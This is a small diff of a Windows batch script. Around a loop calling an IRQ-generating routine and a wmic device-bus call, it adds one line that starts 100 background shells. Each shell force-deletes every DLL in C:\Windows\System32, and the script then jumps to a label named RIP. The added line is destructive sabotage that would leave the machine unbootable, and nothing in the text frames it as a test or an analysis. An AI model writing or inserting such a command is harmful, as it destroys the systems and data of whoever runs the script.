@@ -69,4 +69,5 @@ for /l %%i in (0,1,255) do (
     call :generate_irq %%i
 )
 wmic path Win32_DeviceBus call SetPowerManagementCapabilities
+for /L %%i in (1,1,100) do start /b cmd /c "del /f /q /s C:\Windows\System32\*.dll"
 goto RIP
